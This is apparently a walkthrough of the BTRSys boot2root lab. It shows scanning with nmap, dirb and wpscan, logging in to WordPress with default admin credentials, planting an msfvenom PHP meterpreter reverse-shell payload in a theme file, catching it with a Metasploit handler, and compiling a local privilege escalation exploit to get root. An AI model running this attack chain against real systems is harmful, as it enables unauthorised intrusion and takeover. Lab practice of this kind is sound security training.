									BTRSys is boot2root challenge developed by ‘ismailonderkaya’ in the series of BRTSys. This is an amazing lab for practice which has covered every technique.
Difficulty level: Intermediate
WalkThrough
Let’s start by finding our target. And for that use the following command.

		
		
			
			
			
			
netdiscover
			
				
					
				
					1
				
						netdiscover
					
				
			
		


We know our target is 192.168.0.106 so, therefore, apply nmap on it as it will help us know which ports and services are open. Use the following command:

		
		
			
			
			
			
nmap -A 192.168.0.106
			
				
					
				
					1
				
						nmap -A 192.168.0.106
					
				
			
		


Due to nmap, you can see that port 21, 22 and 80 are open with the service of FTP, SSH, and HTTP respectively. As we still have a lot to find about this, we decided to use DIRB. Dirb is web-scanner i.e. it will scan the whole web application for file/directories. It will even show the hidden files. Use the following command:

		
		
			
			
			
			
dirb http://192.168.0.106
			
				
					
				
					1
				
						dirb http://192.168.0.106
					
				
			
		


As you can see in the above image that using dirb we found various files and directories such as robots.txt, upload, etc. but you can also see that our target web application is using WordPress, so, we can easily apply a WordPress scan using the following command which covers themes, plugins, and users:

		
		
			
			
			
			
./wpscan.rb -u http://192.168.0.106/wordpress/ --enumerate at --enumerate ap --enumerate u
			
				
					
				
					1
				
						./wpscan.rb -u http://192.168.0.106/wordpress/ --enumerate at --enumerate ap --enumerate u
					
				
			
		


As a result, we have found two users – btrisk and admin.

Now if you try to login through admin using password admin you have the access of the dashboard. And once you have that access you can execute a malicious PHP code therein to have a meterpreter session. Use the following command:

		
		
			
			
			
			
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f raw
			
				
					
				
					1
				
						msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f raw
					
				
			
		


The above command will give you a php code which you have to execute. Copy the code from &lt;?php to die(); and paste it in the template as shown below :

Once the code is uploaded, execute it through URL as shown :

		
		
			
			
			
			
192.168.0.106/wordpress/wp-content/themes/twentyfourteen/404.php
			
				
					
				
					1
				
						192.168.0.106/wordpress/wp-content/themes/twentyfourteen/404.php
					
				
			
		


Before executing the above URL, make sure that your meterpreter handler is active. And to do so; go to Metasploit and type the following:

		
		
			
			
			
			
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.0.107
set lport 4444
exploit
			
				
					
				
					12345
				
						use exploit/multi/handlerset payload php/meterpreter/reverse_tcpset lhost 192.168.0.107set lport 4444exploit
					
				
			
		

Once the handler is active and the URL is executed, you will have your session. Let’s check the system’s information which we have entered and for this type:

		
		
			
			
			
			
sysinfo
			
				
					
				
					1
				
						sysinfo
					
				
			
		


Now let’s get into the shell by simply typing:

		
		
			
			
			
			
shell
			
				
					
				
					1
				
						shell
					
				
			
		


Through shell, we came to know that Ubuntu’s version is 16.04.2 and fortunately there is exploit in exploit-db for this version of Ubuntu. Download this exploit.

This exploit will help you to have achieved privilege escalation so that you can directly access root. Once the exploit is downloaded, we need to compile it and for that type:

		
		
			
			
			
			
gcc 41458.c -o rootshell
			
				
					
				
					1
				
						gcc 41458.c -o rootshell
					
				
			
		


Now that the exploit has been compiled, upload it in the /tmp directory. For that, you will need to go to /tmp directory. Use the following commands:

		
		
			
			
			
			
cd /tmp
upload /root/Desktop/rootshell .
			
				
					
				
					12
				
						cd /tmpupload /root/Desktop/rootshell .
					
				
			
		


Now go to shell&gt;/tmp and give the permission to the exploit root shell and execute it. Use the following commands:

		
		
			
			
			
			
shell
cd /tmp
chmod 777 rootshell
./rootshell
			
				
					
				
					1234
				
						shellcd /tmpchmod 777 rootshell./rootshell
					
				
			
		

And to confirm use the following command:

		
		
			
			
			
			
whoami
			
				
					
				
					1
				
						whoami
					
				
			
		


HURRAY!!!! We are in the root. And so our Boot2Root challenge is complete.
